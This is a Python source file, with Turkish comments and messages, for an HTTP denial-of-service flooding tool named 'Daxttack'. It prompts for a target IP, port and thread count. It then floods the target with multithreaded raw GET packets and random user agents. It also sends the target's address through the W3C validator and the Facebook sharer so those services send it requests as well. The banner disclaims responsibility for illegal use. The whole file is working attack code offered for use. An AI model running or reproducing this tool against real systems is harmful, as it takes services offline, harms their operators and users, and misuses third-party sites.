
# python 3.3.2 üstü çalışılır
# by Daxtill
# Discord: Daxtill•EAUS#6318
# Mail : daxtill@protonmail.com
# İllegal kullanımlarından ben sorumlu değilim.

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import argparse
import os 
import tools.addons.clean1
import tools.addons.logo
import tools.addons.clean

#Dosyaya git
os.chdir(os.path.dirname(os.path.realpath(__file__)))

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")

	
	

	
	
	
	
	
	
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[33mDaxBot saldırmayı deniyor...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (''' \033[31m[DAXBOT]\033[0m''',"\033[0m \033[37m <Paketler gönderiliyor...> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBizi Tercih Ettiğiniz İçin Teşekkürler\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m[HATA!] Bot hedef sunucuya bağlanamadı.\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m  
        
       ███████                       ██     ██                     ██
      ░██░░░░██                     ░██    ░██                    ░██
      ░██    ░██  ██████   ██   ██ ██████ ██████  ██████    █████ ░██  ██
      ░██    ░██ ░░░░░░██ ░░██ ██ ░░░██░ ░░░██░  ░░░░░░██  ██░░░██░██ ██
      ░██    ░██  ███████  ░░███    ░██    ░██    ███████ ░██  ░░ ░████
      ░██    ██  ██░░░░██   ██░██   ░██    ░██   ██░░░░██ ░██   ██░██░██
      ░███████  ░░████████ ██ ░░██  ░░██   ░░██ ░░████████░░█████ ░██░░██
      ░░░░░░░    ░░░░░░░░ ░░   ░░    ░░     ░░   ░░░░░░░░  ░░░░░  ░░  ░

            
		                                                        By Daxtill
            
                D:A:X:T:T:A:C:K H:T:T:P A:T:T:A:C:K
	     _______________________________________________  
	    Uyarı: Lütfen VDS , VPS gibi sistemlerde kullanınız.
	            bağlantınız hasar görebilir.
	     _______________________________________________
                
			 

       


         NOT:İLLEGAL OLARAK KULLANILMASI BENİM SORUMLULUĞUMDA DEĞİLDİR
  ______________________________________________________________________________________
                                                                                          
																						  \033[0m''')

def usage2():
	print (''' \033[92m  
        
		
            D:A:X:T:T:A:C:K H:T:T:P A:T:T:A:C:K
	    _______________________________________________  
	   Uyarı: Lütfen VDS , VPS gibi sistemlerde kullanınız.
	            bağlantınız hasar görebilir.
	    _______________________________________________
	                   \033[0m''')
	time.sleep(3)

def clear():
    """
        
    """
    # İşletim Sistemi Windows ise
    if os.name == 'nt':
        _ = os.system('cls')
    # İşletim Sistemi MacOS ise
    elif os.name == 'mac':
        _ = os.system('clear')
    # İşletim Sistemi Linux ise
    elif os.name == 'posix':
        _ = os.system('clear')
    # Yabancı bir işletim sistemi ise
    else:
        _ = os.system('clear')




usage()


host = str(input("\033[31m Ip Adresi > \033[0m"))
port = int(input("\033[33m Port > \033[0m"))
thr = int(input("\033[36mHız (Önerilen: 140) > \033[0m"))
clear()





	
		






# Headersleri okur
global data
headers = open("daxtill.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
    
	usage2()
	
	clear()
	print("\033[34m",host," PORT: ",str(port)," HIZ: ",str(thr),"\033[0m")
	print("\033[33mDaxttack başlatılıyor...\033[0m")
	user_agent()
	my_bots()
	time.sleep(3)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mLütfen ip ve port bilgisini kontrol edin ve yeniden deneyin.\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()

